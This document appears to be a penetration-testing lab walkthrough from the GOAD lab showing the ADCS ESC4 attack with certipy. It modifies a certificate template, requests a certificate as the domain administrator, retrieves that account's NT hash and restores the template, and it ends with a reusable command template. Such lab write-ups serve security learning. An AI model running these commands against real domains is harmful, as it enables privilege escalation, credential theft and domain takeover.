ESC4 exploits certificate templates in Active Directory Certificate Services (ADCS) that grant Full Control permissions, allowing attackers to modify the templates to include fields like subjectAltName (SAN). This enables the attacker to request a certificate for any user, including privileged accounts, by specifying an arbitrary SAN. Combining ESC4 with ESC1, the attacker can use the obtained certificate to impersonate high-privilege users, leading to significant security risks and potential domain compromise.

![[Pasted image 20241006155102.png]]

Saving the template and making it vulnerable to the ESC1 attack:

```bash
garffff@garffff:~/pentest/GOAD/esc3$ certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old -dc-ip 192.168.56.12
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'ESC4' to 'ESC4.json'
[*] Updating certificate template 'ESC4'
[*] Successfully updated 'ESC4'
```

Verifying template change:

![[Pasted image 20241006155529.png]]

Certificate request:

```bash
garffff@garffff:~/GOAD/esc3$  certipy req -u khal.drogo@essos.local -p 'horse' -template ESC4 -ca ESSOS-CA -upn administrator@essos.local -dc-ip 192.168.56.23
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 36
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Authenticating and retrieving target users NTLMv1 hash:

```bash
garffff@garffff:~/GOAD/esc3$ certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```

Restoring template to its original configuration:

```bash
garffff@garffff:~/GOAD/esc3$ certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json -dc-ip 192.168.56.12
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'ESC4'
[*] Successfully updated 'ESC4'
```

Verifying:

![[Pasted image 20241006155755.png]]

### Summary

```bash
certipy template -u <user>@<domain> -p '<password>' -template <template> -save-old -dc-ip <dc_ip>
certipy req -u <user>@<domain> -p '<password>' -template <template> -ca <ca> -upn <target_user>@<domain> -dc-ip <adcs_ip>
certipy auth -pfx <target_user>.pfx -dc-ip <dc_ip>
certipy template -u <user>@<domain> -p '<password>' -template <template> -configuration <template>.json -dc-ip <adcs_ip>
```
